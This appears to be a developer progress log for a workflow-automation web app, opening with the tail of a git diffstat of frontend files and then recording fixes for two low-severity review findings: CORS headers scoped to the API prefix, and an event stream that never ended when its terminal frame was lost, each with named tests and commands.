 .../workflow-lifecycle/workflow-lifecycle.ts       |    2 +-
 web/src/lib/api/generated/workflows/workflows.ts   |   32 +-
 web/src/lib/api/http.ts                            |   16 +
 .../lib/components/ui/sheet/sheet-content.svelte   |   11 +-
 .../workflow-editor/canvas-bridge.svelte           |   39 +
 .../components/workflow-editor/canvas-edge.svelte  |   81 +
 .../components/workflow-editor/canvas-node.svelte  |  376 ++-
 .../components/workflow-editor/node-picker.svelte  |  148 +-
 .../workflow-editor/properties-panel.svelte        |  167 +-
 .../workflow-editor/property-field.svelte          |  534 ++--
 .../workflow-editor/version-panel.svelte           |   62 +-
 .../workflow-editor/workflow-editor.svelte         |  736 +++++-
 web/src/lib/dashboard/execution-list.test.ts       |  102 +
 web/src/lib/dashboard/execution-list.ts            |  106 +
 web/src/lib/dashboard/workflow-list.test.ts        |  101 +
 web/src/lib/dashboard/workflow-list.ts             |  122 +
 web/src/lib/embed/embed-editor.svelte              |  151 +-
 web/src/lib/embed/session.svelte.ts                |   73 +-
 web/src/lib/embed/session.test.ts                  |   66 +-
 web/src/lib/type-guards.ts                         |   13 +
 web/src/lib/workflow-editor/authoring.test.ts      |  118 +
 web/src/lib/workflow-editor/canvas-actions.ts      |   14 +
 web/src/lib/workflow-editor/catalog.test.ts        |   99 +
 web/src/lib/workflow-editor/catalog.ts             |   99 +
 web/src/lib/workflow-editor/clipboard.test.ts      |  203 ++
 web/src/lib/workflow-editor/clipboard.ts           |  293 +++
 web/src/lib/workflow-editor/conditions.test.ts     |   94 +-
 web/src/lib/workflow-editor/conditions.ts          |  176 +-
 web/src/lib/workflow-editor/credentials.test.ts    |   39 +
 web/src/lib/workflow-editor/credentials.ts         |   29 +-
 web/src/lib/workflow-editor/document.test.ts       |  158 ++
 web/src/lib/workflow-editor/document.ts            |  291 ++-
 web/src/lib/workflow-editor/event-stream.svelte.ts |   28 +-
 web/src/lib/workflow-editor/event-stream.test.ts   |   21 +-
 web/src/lib/workflow-editor/execution.test.ts      |   16 +
 web/src/lib/workflow-editor/execution.ts           |    3 +-
 .../lib/workflow-editor/expression-assist.test.ts  |   50 +
 web/src/lib/workflow-editor/expression-assist.ts   |   91 +
 .../lib/workflow-editor/expression-grammar.test.ts |   49 +
 web/src/lib/workflow-editor/expression-grammar.ts  |   49 +
 web/src/lib/workflow-editor/history.test.ts        |   68 +
 web/src/lib/workflow-editor/history.ts             |   93 +
 .../lib/workflow-editor/import-diagnostics.test.ts |   41 +
 web/src/lib/workflow-editor/import-diagnostics.ts  |   92 +
 web/src/lib/workflow-editor/layout.test.ts         |  108 +
 web/src/lib/workflow-editor/layout.ts              |  257 +-
 web/src/lib/workflow-editor/loader-cache.test.ts   |  116 +
 web/src/lib/workflow-editor/loader-cache.ts        |   97 +
 web/src/lib/workflow-editor/node-visual.ts         |   12 +
 web/src/lib/workflow-editor/parameter.test.ts      |   21 +-
 web/src/lib/workflow-editor/parameter.ts           |   16 +
 web/src/lib/workflow-editor/ports.test.ts          |  243 +-
 web/src/lib/workflow-editor/ports.ts               |  125 +-
 web/src/lib/workflow-editor/run-trigger.test.ts    |   75 +
 web/src/lib/workflow-editor/run-trigger.ts         |   39 +
 web/src/lib/workflow-editor/shortcuts.test.ts      |   77 +
 web/src/lib/workflow-editor/shortcuts.ts           |  115 +
 web/src/lib/workflow-editor/sticky.test.ts         |   37 +
 web/src/lib/workflow-editor/sticky.ts              |   75 +
 web/src/lib/workflow-editor/validation.test.ts     |   41 +-
 web/src/lib/workflow-editor/validation.ts          |   38 +-
 web/src/lib/workflow-editor/visibility.ts          |   10 +-
 web/src/lib/workflow-editor/workflow-cache.test.ts |   46 +
 web/src/lib/workflow-editor/workflow-cache.ts      |   33 +
 web/src/routes/(dashboard)/+layout.svelte          |   32 +-
 .../routes/(dashboard)/app/workflows/+page.svelte  |  369 ++-
 .../(dashboard)/app/workflows/[id]/+page.svelte    |  369 ++-
 .../app/workflows/diagnostics-section.svelte       |   10 +-
 .../(dashboard)/app/workflows/import-dialog.svelte |   28 +-
 .../app/workflows/import-report-drawer.svelte      |   60 +
 .../(dashboard)/app/workflows/import-report.svelte |  122 +-
 .../routes/(dashboard)/credentials/+page.svelte    |  147 +-
 web/src/routes/(dashboard)/datastores/+page.svelte |    6 +-
 .../(dashboard)/datastores/[id]/+page.svelte       |  168 +-
 web/src/routes/(dashboard)/executions/+page.svelte |  176 +-
 .../(dashboard)/executions/[id]/+page.svelte       |  223 +-
 web/src/routes/(dashboard)/schedules/+page.svelte  |   59 +-
 web/src/routes/(dashboard)/settings/+page.svelte   |  293 ++-
 web/src/routes/embed/[id]/+page.svelte             |   12 +-
 web/src/routes/login/+page.svelte                  |   75 +
 web/vite.config.ts                                 |    7 +-
 434 files changed, 63787 insertions(+), 4725 deletions(-)
```

## Reopened by review (2026-09-20) — Minor
- **M2 (low)**: CORS is mounted on the shared mux (`internal/api/server.go:144`), so allowlisted origins get CORS on `/webhook/*` and SPA responses too; scope it to `APIPrefix` to keep the fix as narrow as its justification (the events endpoint).
- **M3 (low, confidence medium)**: `handlers/executions.go:394` gates the reconstructed terminal frame on `len(queued) == 0 || !open`, but the record was already terminal when `gateStreamRecord` read it — so a terminal run with a non-empty replay and a dropped terminal publication streams heartbeats forever. Track whether a terminal frame was actually sent and synthesize when it was not.

## Progress 2026-09-20 (FixSecurityFindings) — review findings M2, M3 closed, testing
Status: testing.

**M2 (low)** — commit `4017f2e`: `middleware.CORS` now takes the prefix it is mounted for
and `internal/api/server.go` mounts it with `APIPrefix`, so the layer no longer decorates
`/webhook/*`, `/resume/*`, `/embed/*` or the SPA. The scoping is a property of the layer
rather than of where somebody remembered to call `Use`.
TDD: `TestCORSHeadersStayInsideTheAPIPrefix` (api) fails pre-fix — an allowlisted origin
got `Access-Control-Allow-Origin` on `/webhook/incoming`, `/resume/*`, `/embed/*` and
`/app/*` — and passes after; the events endpoint still reflects the origin, and the
preflight is still answered 204 before the auth gate. The middleware-level
`TestCORSAnswersOnlyInsideTheAPIPrefix` pins the same rule where the layer lives.

**M3 (low)** — commit `fc545c8`: the reconstructed terminal frame was gated on
`len(queued) == 0 || !open`, but the durable record the gate read already said the run was
over, so a replay that kept earlier frames and lost the terminal one streamed heartbeats
forever. The replay loop returns the moment it sends a terminal frame, so reaching the
synthesis means none was sent; the guard is gone and the record supplies the outcome.
TDD: `TestAFinishedExecutionEndsItsStreamEvenWhenTheTerminalFrameWasLost` (2 retained
non-terminal frames + a terminal durable record, no terminal publication) fails pre-fix
(5s of heartbeats, no outcome) and passes after.

Evidence (scoped, passed): `go test ./internal/api/ -run 'CORS|Events|Stream|Embed' -count=1` ok;
`go test ./internal/api/middleware/ -count=1` ok.
